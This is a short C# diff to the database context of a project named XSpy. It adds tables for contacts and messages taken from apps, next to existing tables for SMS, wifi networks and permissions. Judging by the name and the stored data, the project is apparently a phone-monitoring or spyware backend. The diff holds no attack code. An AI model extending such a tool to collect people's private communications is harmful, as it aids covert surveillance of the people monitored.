@@ -123,5 +123,7 @@ namespace XSpy.Database
         public DbSet<Permission> Permissions { get; set; }
         public DbSet<Wifi> WifiList { get; set; }
         public DbSet<Sms> Messages { get; set; }
+        public DbSet<AppContact> AppContacts { get; set; }
+        public DbSet<AppMessage> AppMessages { get; set; }
     }
 }
